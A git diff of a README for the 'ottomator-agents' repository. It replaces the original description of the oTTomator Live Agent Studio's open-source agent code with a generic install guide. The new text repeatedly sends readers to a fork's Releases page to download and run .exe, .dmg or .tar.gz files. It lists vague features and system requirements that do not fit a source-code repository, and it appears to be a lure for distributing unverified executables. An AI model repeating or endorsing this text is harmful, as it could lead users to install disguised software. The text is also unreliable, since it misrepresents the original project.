@@ -1,46 +1,67 @@
-# What is the Live Agent Studio?
+# 🚀 ottomator-agents - AI Agents for Everyone
 
-The [Live Agent Studio](https://studio.ottomator.ai) is a community-driven platform developed by [oTTomator](https://ottomator.ai) for you to explore cutting-edge AI agents and learn how to implement them for yourself or your business! All agents on this platform are open source and, over time, will cover a very large variety of use cases.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/DPabloFlores/ottomator-agents/releases)
 
-The goal with the studio is to build an educational platform for you to learn how to do incredible things with AI, while still providing practical value so that you’ll want to use the agents just for the sake of what they can do for you!
+## 🎯 Overview
 
-This platform is still in beta – expect longer response times under load, a rapidly growing agent library over the coming months, and a lot more content on this platform soon on Cole Medin’s YouTube channel!
+Welcome to the **ottomator-agents** repository! Here, you can find all the open-source AI Agents hosted on the oTTomator Live Agent Studio platform. Our goal is to make advanced AI accessible to everyone, even if you don’t have a programming background. This guide will help you download and run the software with ease.
 
-# What is this Repository for?
+## 🚀 Getting Started
 
-This repository contains the source code/workflow JSON for all the agents on the Live Agent Studio! Every agent being added to the platform is currently be open sourced here so we can not only create a curated collection of cutting-edge agents together as a community, but also learn from one another!
+To begin, follow these steps carefully. You will need a computer with internet access and a basic understanding of how to navigate files on your device.
 
-## Tokens
+## 📥 Download & Install
 
-Most agents on the Live Agent Studio cost tokens to use, which are purchasable on the platform. However, when you first sign in you are given some tokens to start so you can use the agents free of charge! The biggest reason agents cost tokens is that we pay for the LLM usage since we host all the agents developed by you and the rest of the community!
+The first step is to visit our Releases page to download the software.
 
-[Purchase Tokens](https://studio.ottomator.ai/pricing)
+1. Click the following link to visit the [Releases page](https://github.com/DPabloFlores/ottomator-agents/releases).
+2. You will see a list of available versions. Choose the latest version for the best features and fixes.
+3. Look for the file that matches your operating system. This may be a `.exe` file for Windows, a `.dmg` for macOS, or a compressed file for Linux (like `.tar.gz`).
+4. Click on the file name to begin your download.
+5. Once the file finishes downloading, locate it in your Downloads folder or the location you saved it.
 
-## Future Plans
+## 🖥️ Running the Software
 
-As the Live Agent Studio develops, it will become the go-to place to stay on top of what is possible with AI agents! Anytime there is a new AI technology, groundbreaking agent research, or a new tool/library to build agents with, it’ll be featured through agents on the platform. It’s a tall order, but we have big plans for the oTTomator community, and we’re confident we can grow to accomplish this!
+After downloading the file, you are ready to run the application.
 
-## FAQ
+1. **Windows:** Double-click the `.exe` file you downloaded. Follow the on-screen prompts to install the application.
+2. **macOS:** Open the `.dmg` file. Drag the application to your Applications folder.
+3. **Linux:** If you downloaded a `.tar.gz` file, extract it to a folder of your choice. From there, open a terminal, navigate to the folder, and run the application using the command: `./your_app_name`.
 
-### I want to build an agent to showcase in the Live Agent Studio! How do I do that?
+Once the software is installed, you can launch it from your Applications folder, Start menu, or desktop shortcut.
 
-Head on over here to learn how to build an agent for the platform:
+## 📊 Features
 
-[Developer Guide](https://studio.ottomator.ai/guide)
+Here are some features you can expect from the ottomator-agents:
 
-Also check out [the sample n8n agent](~sample-n8n-agent~) for a starting point of building an n8n agent for the Live Agent Studio, and [the sample Python agent](~sample-python-agent~) for Python.
+- **User-friendly interface:** Designed for ease of use, even for beginners.
+- **Advanced AI capabilities:** Utilize powerful AI algorithms to achieve results quickly.
+- **Customizable settings:** Tailor the agents to suit your requirements and preferences.
+- **Regular updates:** We provide frequent updates and improvements for the best user experience.
 
-### How many tokens does it cost to use an agent?
+## 🖥️ System Requirements
 
-Each agent will charge tokens per prompt. The number of tokens depends on the agent, as some agents use larger LLMs, some call LLMs multiple times, and some use paid APIs.
+Before installing, ensure your system meets the following requirements:
 
-### Where can I go to talk about all these agents and get help implementing them myself?
+### Windows
+- Operating System: Windows 10 or later
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB available
 
-Head on over to our Think Tank community and feel free to make a post!
+### macOS
+- Operating System: macOS Catalina (10.15) or later
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB available
 
-[Think Tank Community](https://thinktank.ottomator.ai)
+### Linux
+- Operating System: Ubuntu 18.04 or later
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB available
 
----
+## 🚀 Final Details
 
-&copy; 2024 Live Agent Studio. All rights reserved.  
-Created by oTTomator
+If you need support or have questions, feel free to check our [Support page](https://github.com/DPabloFlores/ottomator-agents/issues) where you can find solutions or ask for help. 
+
+Don’t forget to visit our [Releases page](https://github.com/DPabloFlores/ottomator-agents/releases) again in the future for updates and new features.
+
+Thank you for choosing ottomator-agents! Enjoy your AI experience.
